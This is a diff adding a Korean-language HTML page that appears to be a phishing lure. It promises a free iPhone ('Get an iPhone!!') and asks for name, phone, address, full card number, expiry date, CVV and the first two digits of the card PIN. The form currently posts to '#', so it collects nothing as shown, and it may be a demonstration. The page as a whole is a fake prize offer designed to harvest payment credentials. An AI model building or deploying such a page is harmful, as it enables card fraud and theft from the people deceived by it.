@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>개인정보 입력 페이지</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f9f9f9;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            background-color: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 250px;
+            margin-top: 150px;
+        }
+        input {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .button {
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100px;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        img{
+            margin-top: 50px;
+            width: 300px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3>필수정보 입력</h3>
+        <form action="#" method="POST">
+            <input type="text" name="name" placeholder="이름" required>
+            <input type="tel" name="phone" placeholder="전화번호" required>
+            <input type="text" name="address" placeholder="주소" required>
+            <input type="text" name="cardNumber" placeholder="카드번호 (숫자만 입력)" pattern="\d{16}" required>
+            <input type="text" name="expiryDate" placeholder="유효기간 (MM/YY)" pattern="\d{2}/\d{2}" required>
+            <input type="text" name="cvv" placeholder="CVV (3자리)" pattern="\d{3}" required>
+            <input type="text" name="cp" placeholder="카드 비밀번호 (앞2자리)" pattern="\d{2}" required>
+            <button class="button" type="submit">아이폰 받기!!</button>
+        </form>
+    </div>
+
+    <div>
+        <img src="https://i0.wp.com/designcompass.org/wp-content/uploads/2024/09/iphone16-01.png?fit=800%2C600&ssl=1">
+    </div>
+</body>
+</html>
